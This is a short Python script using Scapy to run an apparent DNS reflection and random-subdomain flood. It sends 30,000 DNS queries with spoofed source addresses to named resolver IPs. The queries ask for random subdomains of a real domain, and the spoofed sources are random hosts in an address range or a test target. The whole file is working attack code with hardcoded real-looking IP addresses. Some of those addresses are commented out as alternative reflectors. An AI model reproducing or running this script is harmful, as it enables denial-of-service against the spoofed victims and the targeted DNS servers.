from scapy.all import *
import uuid
import random
import math

#reflector = "147.228.3.3"
#pdev
#reflector = "147.228.52.32"
#hapi
#reflector = "147.228.52.21"
#laviina
#reflector = "147.228.58.47"


#reflector = "147.228.52.32"
reflector = "147.228.1.170"
count = 30000

test = 0
#test_target = "147.228.1.133"
test_target = "147.228.1.250"

for x in range(0, count):
	dom = str(uuid.uuid4().get_hex().upper()[0:random.randint(4,6)])

	if test:
		target = test_target
	else:
		target = "147.228.%d.%d" % (244,random.randint(0,255))

	pkt=IP(src=target, dst=reflector)/UDP(dport=53,sport=RandShort())/DNS(id=RandShort(),qd=DNSQR(qname=dom+".dns.zcu.cz"))
	send(pkt,loop=0,verbose=0)

